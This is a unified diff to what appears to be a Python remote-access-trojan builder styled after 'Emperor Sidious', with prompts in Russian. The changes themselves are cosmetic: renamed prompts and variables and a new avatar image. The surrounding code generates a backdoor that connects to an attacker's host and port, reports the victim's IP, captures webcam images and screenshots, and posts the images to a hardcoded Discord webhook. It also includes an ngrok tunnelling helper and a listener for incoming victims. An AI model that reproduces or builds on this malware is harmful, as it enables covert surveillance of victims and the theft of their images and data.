@@ -80,13 +80,13 @@ def TEXT_DELAY(TEXT, DELAY):
     print()
     
 def BACKDOOR():
-    LHOST = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mLHOST\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
-    LPORT = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mLPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
+    LHOST = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mLHOST\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
+    LPORT = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mLPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
     print(" \033[97;1m[\033[38;5;208m...\033[0m] Backdoor generation in '.exe' file in progress...\033[0m")
     time.sleep(2)
 
-    with open("backdoor/backdoor.py", "w") as file:
-        file.write(f'''
+    with open("backdoor/backdoor.py", "w") as FILE:
+         FILE.write(f'''
 import os
 import time
 import socket
@@ -96,6 +96,7 @@ import pyautogui
 import cv2
 import ctypes
 import subprocess
+from flask import Flask, render_template, Response, url_for
 
 
 def MALWARE():
@@ -123,16 +124,16 @@ def MALWARE():
            SOCKET.send(IPINFO.text.encode())
            
         if MALWARE_RECV == "webcam":
-           CAP = cv2.VideoCapture(0)
+           WEBCAM = cv2.VideoCapture(0)
 
            while True:
-               RET, FRAME = CAP.read()
-               cv2.imshow('Webcam', FRAME)
+               RET, FRAME = WEBCAM.read()
     
+               cv2.imshow('Webcam', FRAME)
                if cv2.waitKey(1) & 0xFF == ord('s'):
                   break
 
-           CAP.release()
+           WEBCAM.release()
            cv2.destroyAllWindows()
            
         if MALWARE_RECV == "screenshot":
@@ -153,8 +154,8 @@ def MALWARE():
            WEBHOOK = "https://discord.com/api/webhooks/1165737675635036200/jnvMkGQnYcEHQ1fjuAFKxfwCkNM729umhnG4n_0t8he2bOkiKGbsayb6mo0EpYKzTymK"
            FILES = {{"file1": open("WEBCAM.jpg", "rb")}}
            DATA = {{
-               "username": "Сидиус",
-               "avatar_url":"https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Sith_Emblem_(Star_Wars).svg/langfr-280px-Sith_Emblem_(Star_Wars).svg.png"
+               "username": "Император Сидий",
+               "avatar_url":"https://i.pinimg.com/736x/95/4f/de/954fde8e632be62678574ee83643131e.jpg"
            }}
            RESPONSE = requests.post(WEBHOOK, data=DATA, files=FILES)        
 
@@ -171,8 +172,8 @@ MALWARE()
 ''')
 
 def NGROK():
-    IP = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mIP\033[0m\033[97;1m]\n\033[97;1m ╚═════════|> \033[0m")
-    PORT = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════|> \033[0m")
+    IP = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mIP\033[0m\033[97;1m]\n\033[97;1m ╚═════════|> \033[0m")
+    PORT = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════|> \033[0m")
     NGROK_COMMAND = f"ngrok tcp {IP}:{PORT}"
     subprocess.run(NGROK_COMMAND, shell=True)
     
@@ -183,8 +184,8 @@ def LISTENER():
     TEXT_DELAY(EMPEROR_LOGO_BANNER, 0.0005)
     TEXT_DELAY(LISTENER_MENU_BANNER, 0.0005)
  
-    LHOST = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mLHORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")  
-    LPORT = input(" \033[97;1m╔═[\033[0m\033[91mСидиус\033[0m\033[97;1m]═[\033[91mLPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
+    LHOST = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mLHORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")  
+    LPORT = input(" \033[97;1m╔═[\033[0m\033[91mИмператор Сидий\033[0m\033[97;1m]═[\033[91mLPORT\033[0m\033[97;1m]\n\033[97;1m ╚═════════>>> \033[0m")
 
     SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     SOCKET.bind((LHOST, int(LPORT)))
@@ -193,7 +194,7 @@ def LISTENER():
     print(" \033[97;1m[\033[38;5;208m...\033[0m] Waiting for the target machine to connect...\033[0m")
 
     CONN, ADDR = SOCKET.accept()
-    print(" \033[97;1m[\033[38;5;208m...\033[0m] Connection established from >\033[0m", ADDR)
+    print(" \033[97;1m[\033[38;5;208m...\033[0m] Connection established from >>>\033[0m", ADDR)
 
     while True:
         print("")
